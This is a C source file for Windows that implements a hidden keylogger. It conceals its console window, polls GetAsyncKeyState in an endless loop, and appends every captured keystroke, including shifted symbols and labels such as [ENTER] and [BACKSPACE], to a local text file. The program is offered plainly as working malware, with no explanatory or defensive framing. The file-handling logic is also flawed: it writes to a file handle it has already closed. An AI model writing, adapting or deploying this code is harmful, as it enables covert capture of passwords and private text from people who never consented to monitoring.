#include <windows.h>
#include <stdio.h>
#include <winuser.h>

int main()
{
    HWND stealth;
    AllocConsole();
    stealth = FindWindowA("ConsoleWindowClass", NULL);
    ShowWindow(stealth, SW_HIDE);

    FILE *file;
    file = fopen("file.txt", "a+");
    if (file == NULL)
    {
        return 1;
    }

    SHORT character;
    while (1)
    {
        for (character = 8; character <= 222; character++)
        {
            if (GetAsyncKeyState(character) == -32767)
            {
                if (file == NULL)
                {
                    file = fopen("file.txt", "a+");
                    if (file == NULL)
                    {
                        return 1;
                    }
                }

                if ((character > 64) && (character < 91) && !(GetAsyncKeyState(0x10)))
                {
                    character += 32;
                    fputc(character, file);
                    fclose(file);
                    break;
                }
                else if (GetAsyncKeyState(VK_CAPITAL) == 0)
                {
                    if ((character >= 64) && (character <= 91))
                    {
                        fputc(character, file);
                        fclose(file);
                        break;
                    }
                }
                else if (GetAsyncKeyState(0x10))
                {
                    if ((character >= 64) && (character <= 91))
                    {
                        fputc(character, file);
                        fclose(file);
                        break;
                    }
                }
                else
                {
                    switch (character)
                    {
                    case VK_SPACE:
                        fputc(' ', file);
                        fclose(file);
                        break;
                    case VK_SHIFT:
                        fputs("[SHIFT]", file);
                        fclose(file);
                        break;
                    case VK_RETURN:
                        fputs("\r[ENTER]\r", file);
                        fclose(file);
                        break;
                    case VK_BACK:
                        fputs("\r[BACKSPACE]\r", file);
                        fclose(file);
                        break;
                    case VK_TAB:
                        fputs("\r[TAB]\r", file);
                        fclose(file);
                        break;
                    case VK_CONTROL:
                        fputs("\r[CTRL]\r", file);
                        fclose(file);
                        break;
                    case VK_DELETE:
                        fputs("\r[DEL]\r", file);
                        fclose(file);
                        break;
                    case VK_ESCAPE:
                        fputs("\r[ESC]\r", file);
                        fclose(file);
                        break;
                    case VK_UP:
                        fputs("\r[UP]\r", file);
                        fclose(file);
                        break;
                    case VK_RIGHT:
                        fputs("\r[RIGHT]\r", file);
                        fclose(file);
                        break;
                    case VK_DOWN:
                        fputs("\r[DOWN]\r", file);
                        fclose(file);
                        break;
                    case VK_LEFT:
                        fputs("\r[LEFT]\r", file);
                        fclose(file);
                        break;

                    case 190:
                    case 110:
                        fputs("[.]", file);
                        fclose(file);
                        break;

                    case 48:
                        if (GetAsyncKeyState(0x10))
                        {
                            fputs(")", file);
                            fclose(file);
                        }
                        else
                        {
                            fputs("0", file);
                            fclose(file);
                        }
                        break;
                    case 49:
                        if (GetAsyncKeyState(0x10))
                        {
                            fputs("!", file);
                            fclose(file);
                        }
                        else
                        {
                            fputs("1", file);
                            fclose(file);
                        }
                        break;
                    case 50:
                        if (GetAsyncKeyState(0x10))
                        {
                            fputs("@", file);
                            fclose(file);
                        }
                        else
                        {
                            fputs("2", file);
                            fclose(file);
                        }
                        break;
                    case 51:
                        if (GetAsyncKeyState(0x10))
                        {
                            fputs("#", file);
                            fclose(file);
                        }
                        else
                        {
                            fputs("3", file);
                            fclose(file);
                        }
                        break;
                    case 52:
                        if (GetAsyncKeyState(0x10))
                        {
                            fputs("$", file);
                            fclose(file);
                        }
                        else
                        {
                            fputs("4", file);
                            fclose(file);
                        }
                        break;
                    case 53:
                        if (GetAsyncKeyState(0x10))
                        {
                            fputs("%", file);
                            fclose(file);
                        }
                        else
                        {
                            fputs("5", file);
                            fclose(file);
                        }
                        break;
                    case 54:
                        if (GetAsyncKeyState(0x10))
                        {
                            fputs("^", file);
                            fclose(file);
                        }
                        else
                        {
                            fputs("6", file);
                            fclose(file);
                        }
                        break;
                    case 55:
                        if (GetAsyncKeyState(0x10))
                        {
                            fputs("&", file);
                            fclose(file);
                        }
                        else
                        {
                            fputs("7", file);
                            fclose(file);
                        }
                        break;
                    case 56:
                        if (GetAsyncKeyState(0x10))
                        {
                            fputs("*", file);
                            fclose(file);
                        }
                        else
                        {
                            fputs("8", file);
                            fclose(file);
                        }
                        break;
                    case 57:
                        if (GetAsyncKeyState(0x10))
                        {
                            fputs("(", file);
                            fclose(file);
                        }
                        else
                        {
                            fputs("9", file);
                            fclose(file);
                        }
                        break;
                    }
                }
            }
        }
    }
    return 0;
}
